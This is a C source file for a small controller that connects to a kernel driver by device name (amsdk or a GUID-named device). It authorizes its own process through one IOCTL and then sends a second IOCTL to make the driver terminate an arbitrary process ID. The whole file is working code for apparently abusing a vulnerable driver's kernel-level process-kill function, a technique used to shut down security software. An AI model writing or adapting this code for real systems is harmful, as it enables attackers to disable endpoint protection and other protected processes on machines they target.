#include "controller.h"
#include <stdio.h>
#include <stdlib.h>

struct Controller {
    HANDLE hDriver;
};

#define IOCTL_AUTHORIZE_PROCESS     0x80002010
#define IOCTL_TERMINATE_PROCESS_CMD 0x80002048

typedef struct {
    DWORD TargetProcessId;
    DWORD ShouldWaitForExit;
} TerminateRequestPayload;

static BOOL AuthorizeProcess(HANDLE hDriver) {
    DWORD currentPid = GetCurrentProcessId();
    DWORD bytesReturned = 0;

    return DeviceIoControl(
        hDriver,
        IOCTL_AUTHORIZE_PROCESS,
        &currentPid,
        sizeof(currentPid),
        NULL,
        0,
        &bytesReturned,
        NULL
    );
}

Controller* Controller_Create(void) {
    LPCWSTR deviceNames[] = {
        L"\\\\.\\amsdk",
        L"\\\\.\\B5A6B7C9-1E31-4E62-91CB-6078ED1E9A4F"
    };
    int numDeviceNames = sizeof(deviceNames) / sizeof(deviceNames[0]);
    HANDLE hDevice = INVALID_HANDLE_VALUE;
    
    int i;
    for (i = 0; i < numDeviceNames; ++i) {
        hDevice = CreateFileW(
            deviceNames[i],
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );
        if (hDevice != INVALID_HANDLE_VALUE) {
            break; // Success
        }
    }

    if (hDevice == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[!] Could not establish a connection with the kernel driver.\n");
        return NULL;
    }

    if (!AuthorizeProcess(hDevice)) {
        fprintf(stderr, "[!] Failed to authorize this application with the driver. Error: %lu\n", GetLastError());
        CloseHandle(hDevice);
        return NULL;
    }

    Controller* controller = (Controller*)malloc(sizeof(Controller));
    if (!controller) {
        fprintf(stderr, "[!] Memory allocation failed.\n");
        CloseHandle(hDevice);
        return NULL;
    }

    controller->hDriver = hDevice;
    return controller;
}

void Controller_Destroy(Controller* controller) {
    if (controller != NULL) {
        if (controller->hDriver != INVALID_HANDLE_VALUE) {
            CloseHandle(controller->hDriver);
        }
        free(controller);
    }
}

BOOL Controller_TerminateProcess(Controller* controller, DWORD processId, bool waitForExit) {
    if (controller == NULL) {
        SetLastError(ERROR_INVALID_HANDLE);
        return FALSE;
    }

    TerminateRequestPayload payload;
    payload.TargetProcessId = processId;
    payload.ShouldWaitForExit = waitForExit ? 1 : 0;

    DWORD bytesReturned = 0;
    return DeviceIoControl(
        controller->hDriver,
        IOCTL_TERMINATE_PROCESS_CMD,
        &payload,
        sizeof(payload),
        NULL,
        0,
        &bytesReturned,
        NULL
    );
}